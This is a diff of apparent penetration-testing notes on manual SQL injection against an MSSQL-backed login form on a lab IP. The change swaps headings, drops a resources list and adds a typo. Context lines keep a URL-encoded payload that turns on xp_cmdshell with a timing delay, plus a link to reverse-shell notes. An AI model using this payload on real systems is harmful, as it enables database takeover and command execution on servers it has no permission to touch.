@@ -6,13 +6,13 @@
 
 ---
 
-Manual SQLi: quote to error, `ORDER BY` for column count, delay to confirm, then encode for the body.
+# Web Enumeration
 
 ## Check
 
 Add a single quotation to each field and see if there is an error.
 
-```http
+```request
 POST /login.aspx HTTP/1.1
 Host: 192.168.179.50
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0
@@ -84,11 +84,6 @@ to got the URI encoded body for query string if field does not allow for special
 '%20EXEC%20sp_configure%20'show%20advanced%20options'%2C%20'1'%3B%20RECONFIGURE%3B%20EXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%20%3B%20RECONFIGURE%20%3B%20WAITFOR%20DELAY%20'00%3A00%3A03'%20--
 ```
 
-## Get reverse
+## Get reversre
 
-See [sql](../../infiltration/reverse-shell/sql.md).
-
-## Resources
-
-- [PayloadsAllTheThings — SQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) — ORDER BY / UNION / stacked
-- [HackTricks — SQL injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html) — MSSQL stacked / xp_cmdshell
+../../infiltration/reverse-shell/sql.md
